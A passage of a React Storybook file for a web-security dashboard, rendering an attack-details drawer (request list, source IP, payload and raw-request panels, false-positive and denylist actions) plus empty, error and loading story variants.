                      </PieChartDonut>
                      <PieChartLegend>
                        {statusCodes.map(row => (
                          <PieChartLegendItem key={row.name} name={row.name}>
                            <Badge color={row.color} type='secondary' textVariant='code'>
                              {row.name}
                            </Badge>
                            <PieChartLegendValue>
                              {formatCount(row.value)}
                              <LegendDot />
                              <PieChartLegendPercent />
                            </PieChartLegendValue>
                          </PieChartLegendItem>
                        ))}
                      </PieChartLegend>
                    </PieChart>
                  </Chart>
                </div>
              </VStack>
            </DrawerBody>
          )}

          {selected && tab === 'requests' && (
            <div className='flex min-h-0 flex-1 flex-col' data-testid='attack-requests'>
              <HStack gap={8} className='shrink-0 border-b border-border-primary-light px-16 py-8'>
                <div className='min-w-0 flex-1'>
                  <FilterInput placeholder='Filter requests...' />
                </div>
                <Button variant='ghost' color='neutral' size='small'>
                  <ArrowDown /> Date
                </Button>
              </HStack>
              <div className='flex min-h-0 flex-1'>
                <div className='w-320 shrink-0 border-r border-border-primary-light'>
                  <ScrollArea>
                    <ScrollAreaViewport>
                      <ScrollAreaContent>
                        <VStack gap={2} className='p-8' data-testid='attack-request-list'>
                          {requests.map(item => (
                            <button
                              key={item.id}
                              type='button'
                              value={item.id}
                              aria-pressed={item.id === requestId}
                              onClick={handleSelectRequest}
                              className={
                                item.id === requestId
                                  ? 'w-full rounded-8 bg-states-primary-default-alt p-8 text-left'
                                  : 'w-full rounded-8 p-8 text-left hover:bg-states-primary-hover'
                              }
                            >
                              <VStack gap={2}>
                                <HStack gap={4}>
                                  <FormatDateTime
                                    value={item.time}
                                    format='datetime'
                                    layout='inline'
                                  />
                                  <div className='ml-auto'>
                                    <ResponseCode code={item.code} />
                                  </div>
                                </HStack>
                                <HStack gap={4}>
                                  <Badge type='secondary' color='slate' size='medium'>
                                    {ATTACK_TYPES[selected.attackType]}
                                  </Badge>
                                </HStack>
                                <HStack gap={4}>
                                  <HttpMethod method={selected.method} />
                                  <Text size='xs' truncate>
                                    {selected.path}
                                  </Text>
                                </HStack>
                                <Text size='xs' color='secondary' truncate>
                                  {selected.host}
                                </Text>
                              </VStack>
                            </button>
                          ))}
                        </VStack>
                      </ScrollAreaContent>
                    </ScrollAreaViewport>
                    <ScrollAreaScrollbar />
                  </ScrollArea>
                </div>
                <div className='min-w-0 flex-1' data-testid='attack-request'>
                  {request ? (
                    <ScrollArea>
                      <ScrollAreaViewport>
                        <ScrollAreaContent>
                          <HStack justify='between' className='px-24 py-8'>
                            <Text size='md'>Request details</Text>
                            <DropdownMenu>
                              <DropdownMenuTrigger asChild>
                                <Button variant='outline' color='neutral' size='small'>
                                  Actions
                                </Button>
                              </DropdownMenuTrigger>
                              <DropdownMenuContent>
                                <DropdownMenuItem onSelect={handleRequestFalsePositive}>
                                  <DropdownMenuItemText>
                                    Mark as false positive
                                  </DropdownMenuItemText>
                                </DropdownMenuItem>
                                <DropdownMenuSeparator />
                                <DropdownMenuItem
                                  variant='destructive'
                                  onSelect={handleRequestBlock}
                                >
                                  <DropdownMenuItemText>Add IP to denylist</DropdownMenuItemText>
                                </DropdownMenuItem>
                              </DropdownMenuContent>
                            </DropdownMenu>
                          </HStack>
                          <div className='grid grid-cols-2 gap-x-8 gap-y-6 px-24 pb-8'>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Source IP</AttributeLabel>
                              <AttributeValue>
                                <Ip>
                                  <IpCountry code={request.source.country} />
                                  <IpAddress>{request.source.ip}</IpAddress>
                                </Ip>
                              </AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Request ID</AttributeLabel>
                              <AttributeValue>
                                <InlineCodeSnippet code={request.id} size='sm' />
                              </AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal' className='col-span-2'>
                              <AttributeLabel>URI</AttributeLabel>
                              <AttributeValue>
                                <HStack gap={6}>
                                  <HttpMethod method={selected.method} />
                                  <Text size='sm' truncate>
                                    {selected.host}
                                    {selected.path}
                                  </Text>
                                </HStack>
                              </AttributeValue>
                            </Attribute>
                          </div>
                          <div className='px-24 py-4'>
                            <Separator />
                          </div>
                          <div className='px-24 py-8'>
                            <Text size='md'>Attack</Text>
                          </div>
                          <div className='grid grid-cols-1 gap-y-6 px-24 pb-8'>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Parameter</AttributeLabel>
                              <AttributeValue>
                                <InlineCodeSnippet code={selected.point} size='sm' />
                              </AttributeValue>
                            </Attribute>
                            <Attribute orientation='horizontal'>
                              <AttributeLabel>Payload</AttributeLabel>
                              <AttributeValue>
                                <InlineCodeSnippet code={selected.payload} size='sm' />
                              </AttributeValue>
                            </Attribute>
                          </div>
                          <div className='px-24 py-4'>
                            <Separator />
                          </div>
                          <div className='px-24 py-8'>
                            <Text size='md'>Full request</Text>
                          </div>
                          <div className='px-24 pb-16'>
                            <CodeSnippetRoot
                              code={selected.request}
                              language='text'
                              lines={getPayloadLines(selected.request, selected.payload)}
                              maxLines={15}
                              wrapLines
                              data-testid='attack-raw-request'
                            >
                              <CodeSnippetContent>
                                <CodeSnippetLineNumbers />
                                <CodeSnippetCode />
                              </CodeSnippetContent>
                            </CodeSnippetRoot>
                          </div>
                        </ScrollAreaContent>
                      </ScrollAreaViewport>
                      <ScrollAreaScrollbar />
                    </ScrollArea>
                  ) : (
                    <div className='flex h-full items-center justify-center'>
                      <Text size='sm' color='secondary'>
                        Select a request to view details
                      </Text>
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}
        </DrawerContent>
      </Drawer>
    </Page>
  );
};

/**
 * The filter matched nothing: the table keeps its header and says "No results found" with a
 * "Reset filters" button that clears the query. The pager hides; there is no create action,
 * since attacks are never created by hand.
 */
export const NoResults = Default.bind({});
NoResults.args = {
  initialFilter: {
    type: 'group',
    operator: 'and',
    children: [
      { type: 'condition', field: 'attack_type', operator: '=', value: 'rce' },
      { type: 'condition', field: 'status', operator: '=', value: 'monitored' },
    ],
  },
};

/**
 * The list failed to load: header, export and filter stay, and the table shows "Couldn't load
 * attacks" with "Try again" in place of the rows.
 */
export const LoadError = Default.bind({});
LoadError.args = { loadFailed: true };

/**
 * First load: the real header and filter, and skeleton rows under the table header. Never a
 * `Loader` in place of the table; the pager waits for the first page.
 */
export const Loading = Default.bind({});
Loading.args = { isLoading: true };
